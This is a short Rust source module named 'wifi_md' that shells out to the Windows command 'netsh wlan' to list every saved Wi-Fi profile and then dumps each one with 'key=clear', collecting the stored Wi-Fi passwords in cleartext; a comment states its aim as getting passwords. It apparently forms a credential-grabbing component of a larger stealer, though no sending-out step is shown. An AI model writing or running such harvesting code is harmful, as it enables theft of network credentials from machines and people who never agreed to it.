pub mod wifi_md
{
	use std::process::Command;
	use std::borrow::Cow;


	// SO THAT GET PASSWORDS
	fn get_keys(profiles: Vec<String>) -> Vec<String>
	{
		let mut output_keys = String::new();
		let mut wifi_list: Vec<String> = Vec::new();

		for (i, x) in profiles.into_iter().enumerate()
		{
			let mut names: Vec<String> = Vec::new();
			let old_output = Command::new("netsh")
				.arg("wlan")
				.arg("show")
				.arg("profile")
				.arg(x)
				.arg("key=clear")
				.output()
				.unwrap();

			let new_output = String::from_utf8_lossy(&old_output.stdout);

			let output: String = match new_output
			{ Cow::Borrowed(x) => x.to_string(),
				Cow::Owned(x) => x.to_string(), };

			//output_keys.push_str(&output);
			//output_keys.push_str("\n_-_-_-_-_-_\n");

			wifi_list.push(output);
		}

		return wifi_list;
	}


	// GET WIFI'S NAME FROM COMMAND
	fn get_profiles() -> Vec<String>
	{
		let mut names: Vec<String> = Vec::new();
		let mut profiles: Vec<String> = Vec::new();
		let old_output = Command::new("netsh")
			.arg("wlan")
			.arg("show")
			.arg("profiles")
			.output()
			.unwrap();

		let new_output = String::from_utf8_lossy(&old_output.stdout);

		let output: String = match new_output
		{ Cow::Borrowed(x) => x.to_string(),
			Cow::Owned(x) => x.to_string(), };

		// 'IF' TO DELETE SYSTEM TEXT
		// 'ELSE' FOR GETTING NECCESSARY TEXT
		for (i, x) in output.lines().enumerate()
		{
			if i <= 8 { continue; }
			else if x.len() == 0 { continue; }
			else { names.push(x.to_string()); }
		}

		let names_clone = names.clone();
		names.clear();

		for x in names_clone.into_iter()
		{
			let idx = x.find(':').unwrap_or_else(|| x.len());
			let (_, part) = x.split_at(idx);

			names.push(part.to_string());
		}

		for mut x in names.clone().into_iter()
		{
			x.remove(0);
			x.remove(0);

			profiles.push(x);
		}

		return profiles;
	}


	pub fn start() -> Vec<String>
	{
		let profiles: Vec<String> = get_profiles();
		println!("{:?}", profiles);

		let data: Vec<String> = get_keys(profiles);
		return data;
	}
}